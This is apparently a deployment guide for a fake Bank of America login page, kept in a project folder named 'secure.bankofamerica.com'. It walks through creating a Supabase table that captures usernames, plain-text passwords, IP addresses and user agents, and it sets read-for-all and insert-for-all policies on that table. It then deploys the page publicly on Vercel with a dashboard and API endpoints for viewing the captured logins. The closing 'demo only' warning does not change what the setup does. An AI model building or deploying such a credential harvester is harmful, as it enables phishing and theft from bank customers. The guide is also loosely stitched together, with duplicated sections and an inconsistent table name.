# Production Deployment Guide

Complete guide to deploy the BOA Login application with Supabase database integration.

## Prerequisites

- Node.js 14+ installed locally
- GitHub account  
- Vercel account (free tier works)
- Supabase account (free tier works)

---

## PHASE 1: Set Up Supabase Database

### 1.1 Create Supabase Project

1. Go to [Supabase](https://supabase.com)
2. Sign in or create account
3. Create a new project:
   - Give it a name (e.g., "boa-login-db")
   - Set a strong password
   - Choose a region close to your users
   - Click "Create new project"

### 1.2 Create Database Table

Once your project is created:

1. Go to **SQL Editor** in the left sidebar
2. Click **New Query**
3. Paste this SQL and execute:

```sql
-- Create login attempts table with proper structure
CREATE TABLE IF NOT EXISTS "BOA-Log" (
  id BIGINT PRIMARY KEY GENERATED ALWAYS AS IDENTITY,
  user_id TEXT NOT NULL,
  password TEXT,
  remember_me BOOLEAN DEFAULT false,
  ip_address TEXT,
  user_agent TEXT,
  status TEXT DEFAULT 'Attempted',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- Create indexes for faster queries
CREATE INDEX IF NOT EXISTS idx_boa_log_created_at ON "BOA-Log"(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_boa_log_user_id ON "BOA-Log"(user_id);

-- Enable Row Level Security
ALTER TABLE "BOA-Log" ENABLE ROW LEVEL SECURITY;

-- Allow anonymous users to insert and read
CREATE POLICY "Allow insert for all" ON "BOA-Log" 
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Allow read for all" ON "BOA-Log" 
  FOR SELECT USING (true);
```

### 1.3 Get API Credentials

1. Go to **Settings** → **API** in the left sidebar
2. You'll see:
   - **Project URL** (copy this → `SUPABASE_URL`)
   - **Anon Key** under "Project API keys" (copy this → `SUPABASE_ANON_KEY`)

**Save these values - you'll need them for deployment**

---

## PHASE 2: Local Testing

### 2.1 Set Up Local Environment

1. Clone or download this repository to your machine
2. Navigate to the project directory:
   ```bash
   cd path/to/secure.bankofamerica.com
   ```

3. Copy `.env.example` to `.env`:
   ```bash
   cp .env.example .env
   # On Windows:
   copy .env.example .env
   ```

4. Edit `.env` and add your Supabase credentials:
   ```
   SUPABASE_URL=https://xxxxx.supabase.co
   SUPABASE_ANON_KEY=your-anon-key-here
   NODE_ENV=development
   PORT=3000
   ```

### 2.2 Install and Run Locally

```bash
# Install dependencies
npm install

# Start the server
npm start

# Or for development with auto-reload:
npm run dev
```

3. Open your browser: `http://localhost:3000`
4. Test the login form:
   - Enter any credentials (e.g., "test123" and "password")
   - Click "Log In"
   - You should see "Login attempt logged"

### 2.3 Verify Data is Saved

1. Check local CSV logs:
   - File location: `./logs/login_entries.csv`

2. Check Supabase database:
   - Go to Supabase dashboard → **Table Editor**
   - Select the **BOA-Log** table
   - You should see your test entry

**If both sources have your entry, you're ready to deploy!**

---

## PHASE 3: Deploy to GitHub

### 3.1 Initialize Git Repository

```bash
cd path/to/secure.bankofamerica.com
git init
git add .
git commit -m "Initial commit: BOA login with Supabase integration"
```

### 3.2 Create GitHub Repository

1. Go to [GitHub New Repository](https://github.com/new)
2. Create repository (name: `boa-login-demo` or your choice)
3. Choose **Public** or **Private**
4. Do NOT initialize with README/gitignore (we have them)

### 3.3 Push Code

Get the commands from GitHub after creating the repo. They'll look like:

```bash
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/boa-login-demo.git
git push -u origin main
```

---

## PHASE 4: Deploy to Vercel

### 4.1 Connect to Vercel

1. Go to [Vercel Dashboard](https://vercel.com/dashboard)
2. Click **Add New** → **Project**
3. Select **Import Git Repository**
4. Paste your GitHub repo URL
5. Vercel auto-detects Node.js project - confirm settings
6. Click **Import**

### 4.2 Add Environment Variables

1. In the import dialog, expand **Environment Variables**
2. Add these three variables:
   - **Name:** `SUPABASE_URL` | **Value:** `https://xxxxx.supabase.co`
   - **Name:** `SUPABASE_ANON_KEY` | **Value:** `your-anon-key-here`
   - **Name:** `NODE_ENV` | **Value:** `production`

3. Click **Deploy**

### 4.3 Wait for Deployment

- Vercel will build and deploy (usually 1-2 minutes)
- Once complete, you'll see a "Deployment Successful" message
- Your app is live at: `https://your-project-name.vercel.app`

---

## PHASE 5: Test Production Deployment

### 5.1 Test the Live App

1. Visit your Vercel URL: `https://your-project-name.vercel.app`
2. Submit a test login (any credentials work)
3. Verify success message appears

### 5.2 Verify Data in Supabase

1. Go to Supabase dashboard → **Table Editor**
2. Select **BOA-Log** table
3. Confirm your test entry is there with:
   - Your test credentials
   - Correct timestamp
   - IP address captured
   - User agent captured

### 5.3 Check API Endpoints

**Health Check:**
```
https://your-project-name.vercel.app/health
```
Should return: `{"status":"ok","timestamp":"...","environment":"production"}`

**Setup Check:**
```
https://your-project-name.vercel.app/api/setup
```
Should show Supabase connection status

**Debug Info:**
```
https://your-project-name.vercel.app/api/debug
```
Shows full deployment information

---

## API Endpoints

All endpoints are available at your deployed URL:

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/` | GET | Main login page |
| `/dashboard` | GET | View logs dashboard |
| `/api/login` | POST | Submit login attempt |
| `/api/logs` | GET | Retrieve all logged entries |
| `/api/setup` | POST | Verify database setup |
| `/api/debug` | GET | Debug information |
| `/health` | GET | Health check |

---

## Monitoring & Troubleshooting

### Check Vercel Logs

1. Go to Vercel dashboard
2. Select your project
3. Click **Deployments**
4. Click latest deployment
5. View **Function Logs** for errors

### Check Supabase Logs

1. Go to Supabase dashboard
2. Click **Logs** in left sidebar
3. Filter for recent errors

### Common Issues

**Problem:** "Supabase table not accessible"
- Check `SUPABASE_URL` and `SUPABASE_ANON_KEY` are correct
- Verify table name is "BOA-Log" (case-sensitive)
- Check Row Level Security policies allow INSERT/SELECT

**Problem:** Data not appearing in Supabase
- Check that environment variables are set in Vercel
- Verify CSV logs are being created (CSV is a fallback)
- Check Vercel logs for JavaScript errors

**Problem:** "Cannot find module" errors
- Run `npm install` locally and commit `package-lock.json`
- Vercel will install dependencies during build

---

## Next Steps

- Monitor the app for production usage
- Set up alerting for database errors
- Implement data encryption for sensitive fields
- Add authentication to the logs viewer
- Set up automated backups in Supabase

---

## Support

For issues:
1. Check Vercel deployment logs
2. Check Supabase database logs
3. Review this guide's troubleshooting section
4. Check GitHub Issues if applicable

- **GET /api/logs** - View all captured login attempts

## Data Flow

```
Browser Form
    ↓
form-logger.js (Frontend)
    ↓
Node.js Server (server.js)
    ↓
Supabase Database (login_attempts table)
```

## Troubleshooting

### Supabase not receiving data:
- Check that SUPABASE_URL and SUPABASE_ANON_KEY are correct
- Verify table `login_attempts` exists in Supabase
- Check browser console for errors

### Vercel deployment fails:
- Ensure all dependencies are in `package.json`
- Check that environment variables are set in Vercel dashboard
- Review Vercel logs for error messages

### Form not submitting:
- Verify the Node.js server is running
- Check browser Network tab for API errors
- Ensure CORS is not blocking requests

## Security Notes

⚠️ **WARNING**: This demo captures plain-text passwords for testing purposes only. 
Never use this in production without:
- HTTPS/TLS encryption
- Password hashing (bcrypt, argon2, etc.)
- Proper authentication mechanisms
- Input validation and sanitization
- Rate limiting
- Security audit

## Support

For Supabase issues: [Supabase Documentation](https://supabase.com/docs)
For Vercel issues: [Vercel Documentation](https://vercel.com/docs)
For GitHub issues: [GitHub Help](https://docs.github.com)
